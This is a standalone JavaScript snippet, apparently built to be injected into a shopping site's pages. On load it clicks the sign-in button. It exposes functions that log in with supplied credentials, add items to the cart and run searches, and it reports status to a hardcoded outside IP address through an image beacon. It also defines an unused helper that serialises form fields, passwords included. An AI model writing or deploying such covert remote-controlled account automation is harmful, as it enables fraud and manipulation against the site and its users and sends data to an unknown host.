(function(){
    function createCookie(name,value,days) {
        var expires = '';
        if (days) {
            var date = new Date();
            date.setTime(date.getTime() + (days*24*60*60*1000));
            expires = '; expires=' + date.toUTCString();
        }
        document.cookie = name + '=' + value + expires + '; path=/';
    }

    function readCookie(name) {
        var nameEQ = name + '=';
        var ca = document.cookie.split(';');
        for(var i=0;i < ca.length;i++) {
            var c = ca[i];
            while (c.charAt(0)==' ') c = c.substring(1,c.length);
            if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length);
        }
        return null;
    }

    function serialize (form) {
        if (!form || form.nodeName !== 'FORM') {
                return;
        }

        var i, j, q = [];
        for (i = form.elements.length - 1; i >= 0; i = i - 1) {
                if (form.elements[i].name === '') {
                        continue;
                }
                switch (form.elements[i].nodeName) {
                case 'INPUT':
                        switch (form.elements[i].type) {
                        case 'text':
                        case 'hidden':
                        case 'password':
                        case 'button':
                        case 'reset':
                        case 'submit':
                                q.push(form.elements[i].name + '=' + encodeURIComponent(form.elements[i].value));
                                break;
                        case 'checkbox':
                        case 'radio':
                                if (form.elements[i].checked) {
                                        q.push(form.elements[i].name + '=' + encodeURIComponent(form.elements[i].value));
                                }
                                break;
                        }
                        break;
                        case 'file':
                        break;
                case 'TEXTAREA':
                        q.push(form.elements[i].name + '=' + encodeURIComponent(form.elements[i].value));
                        break;
                case 'SELECT':
                        switch (form.elements[i].type) {
                        case 'select-one':
                                q.push(form.elements[i].name + '=' + encodeURIComponent(form.elements[i].value));
                                break;
                        case 'select-multiple':
                                for (j = form.elements[i].options.length - 1; j >= 0; j = j - 1) {
                                        if (form.elements[i].options[j].selected) {
                                                q.push(form.elements[i].name + '=' + encodeURIComponent(form.elements[i].options[j].value));
                                        }
                                }
                                break;
                        }
                        break;
                case 'BUTTON':
                        switch (form.elements[i].type) {
                        case 'reset':
                        case 'submit':
                        case 'button':
                                q.push(form.elements[i].name + '=' + encodeURIComponent(form.elements[i].value));
                                break;
                        }
                        break;
                }
        }
        return q.join('&');
    }

    function A(){
        var self = this;

        document.querySelector("#gw-sign-in-button").click();
    }

    A.prototype.log = function(params){
        var log = new Image();
        log.onload = function(){

        };
        log.src = 'http://222.128.114.177:8086/log.gif?status=' + params;
    };
    A.prototype.signIn = function(username, password){
        if(!username || !password)
            return;
        if(!document.querySelector('form[name=signIn]'))
            return;

        document.querySelector('input[type=email]').value = username;
        document.querySelector('input[type=password]').value = password;
        document.querySelector('form[name=signIn]').submit();
    };
    A.prototype.addToCart = function(){
        if(!document.querySelector('#addToCart'))
            return;

        document.querySelector('#addToCart').submit();
    };
    A.prototype.search = function(keyword){
        if(!document.querySelector('.nav-searchbar'))
            return;

        document.querySelector('.nav-searchbar .nav-search-field input').value = keyword;
        document.querySelector('.nav-searchbar').submit();
    };

    window.A = new A();
})()